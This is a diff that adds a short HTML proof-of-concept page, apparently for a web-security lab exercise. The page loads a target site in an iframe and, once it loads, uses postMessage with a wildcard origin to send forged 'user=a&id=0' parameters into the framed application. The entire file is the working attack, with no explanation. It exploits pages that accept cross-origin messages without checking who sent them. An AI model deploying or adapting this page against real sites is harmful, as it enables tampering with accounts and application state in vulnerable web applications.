@@ -1,0 +1,14 @@
+<html>
+<body>
+<iframe id="a" src="http://ptl-2e991417-441b73a9.libcurl.so/" onload="func()" >
+</iframe>
+
+<script>
+function func(){
+document.getElementById("a").contentWindow.postMessage("user=a&id=0", "*");
+}
+</script>
+
+
+</body>
+</html>
